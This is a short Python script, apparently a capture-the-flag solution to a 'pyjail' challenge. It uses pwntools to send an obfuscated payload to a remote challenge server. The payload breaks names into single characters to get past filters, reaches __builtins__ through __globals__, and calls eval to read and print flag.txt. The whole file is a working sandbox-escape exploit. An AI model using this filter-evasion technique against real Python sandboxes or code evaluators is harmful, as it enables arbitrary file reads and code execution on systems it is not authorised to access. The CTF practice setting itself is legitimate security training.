from pwn import remote

payload = '''f	.__globals__.	pop	(	"_"+"_"+ 'b' + 	"u"	 + 	"i"	 + 'l' + 't' + 	"i"	 + 'n' + 	"s"+"_"+"_").eval	(	 'f' + '.' + 	"_"	 + 	"_"	 + 'b' + 	"u"	 + 	"i"	 + 'l' + 't' + 	"i"	 + 'n' + 	"s"	 + 	"_"	 + 	"_"	 + 	"["	 + '"' + 'p' + 'r' + 	"i"	 + 'n' + 't' + '"' + 	"]"	 + '(' + 'f' + '.' + 	"_"	 + 	"_"	 + 'b' + 	"u"	 + 	"i"	 + 'l' + 't' + 	"i"	 + 'n' + 	"s"	 + 	"_"	 + 	"_"	 + 	"["	 + '"' + 	"o"	 + 'p' + 	"e"	 + 'n' + '"' + 	"]"	 + '(' + '"' + 'f' + 'l' + 	"a"	 + 	"g"	 + '.' + 't' + 'x' + 't' + '"' + 	")"	 + '.' + 'r' + 	"e"	 + 	"a"	 + 'd' + '(' + 	")"	 + 	")")'''

r = remote('challs3.pyjail.club', 9328)
r.recvuntil(b'> ')
r.sendline(payload.encode())
print(r.recv().decode())
